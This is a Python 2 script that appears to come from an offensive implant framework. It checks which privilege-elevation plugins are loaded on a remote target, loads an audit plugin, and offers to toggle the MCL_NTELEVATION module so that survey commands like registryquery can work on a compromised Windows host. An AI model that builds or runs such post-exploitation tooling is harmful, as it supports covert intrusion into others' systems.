
import ops.env
import ops.cmd
import dsz.cmd
import dsz.ui

def main():
    plugin_cmd = ops.cmd.getDszCommand('plugins')
    plugin_result = plugin_cmd.execute()
    for plugin in plugin_result.remote.plugin:
        if (plugin.id in [112, 113, 122, 123, 124]):
            print 'NT_ELEVATION loaded correctly, moving on'
            return
    (success, cmdid) = dsz.cmd.RunEx('loadplugin -id 211')
    if (success == False):
        print 'Failed to load appropriate Mcl_NtElevation plugin. Would you like to toggle MCL_NTELEVATION to FAIL?'
        print 'If you choose no, things such as registryquery are likely to fail throughout the survey.'
        choice = dsz.ui.Prompt('Toggle MCL_NTELEVATION to FAIL? [Y/n]: ')
        if choice:
            (success, cmdid) = dsz.cmd.RunEx('moduletoggle -system MCL_NTELEVATION -set FAIL')
            (successAudit, cmdidAudit) = dsz.cmd.RunEx('loadplugin -id 211')
            if ((success == True) and (successAudit == True)):
                print 'MCL_NTELEVATION = FAIL'
            else:
                print "Error! I couldn't load audit after setting MCL_NTELEVATION to FAIL. This isn't going to be fun..."
            return
        else:
            print 'Several of your survey commands (including registryquery) are likely to fail -- you are warned!'
            print 'If you want to change your mind later, run moduletoggle -system MCL_NTELEVATION -set FAIL'
            return
    else:
        print 'Able to load audit plugin, NT_ELEVATION loaded correctly, moving on'
if ((__name__ == '__main__') or (__name__ == ops.survey.PLUGIN)):
    main()